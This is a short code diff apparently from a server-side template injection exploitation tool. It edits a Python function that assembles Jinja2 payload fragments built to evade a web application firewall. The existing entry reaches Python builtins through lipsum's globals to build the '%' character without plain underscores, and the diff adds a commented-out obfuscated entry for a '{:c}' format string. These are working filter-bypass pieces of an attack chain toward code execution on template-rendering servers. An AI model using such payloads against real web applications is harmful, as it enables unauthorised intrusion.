@@ -21,7 +21,8 @@ def get_str_context(waf_func):
         ("perc", "%", "{%set perc=(lipsum[(lipsum|escape|batch(22)|list|first|last)*2" +
          "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]" +
          "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)" +
-         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))%}")
+         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))%}"),
+        # ("fc", "{:c}", "{%set fc={{{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)}}%}")
     ]
     str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
     return "".join(payload for _, _, payload in str_vars), {var_name: var_value for var_name, var_value, _ in str_vars}
